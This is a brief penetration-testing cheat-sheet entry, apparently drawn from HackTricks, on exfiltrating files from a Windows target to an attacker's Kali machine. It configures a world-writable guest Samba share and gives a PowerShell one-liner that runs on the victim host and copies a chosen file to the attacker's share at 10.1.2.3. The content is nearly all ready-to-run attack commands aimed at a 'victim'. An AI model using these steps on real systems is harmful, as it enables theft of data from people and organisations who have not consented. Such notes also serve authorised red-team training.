# Exfiltration using powershell and samba(Linux)

## On Kali

Upload a file to the victim's host[^1] 

```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb

#Add to the end of /etc/samba/smb.conf this:
[public]
    comment = Samba on Ubuntu
    path = /tmp/smb
    read only = no
    browsable = yes
    guest ok = Yes
    
    
#Start samba
service smbd restart
```

## On the target machine
```powershell
start powershell -c "Copy-Item -Path 'C:\<path>\file.txt>' -Destination '\\10.1.2.3\public\'"
```
    
[^1]: [Hacktricks.xyz](https://book.hacktricks.xyz/exfiltration#upload-file-to-victim)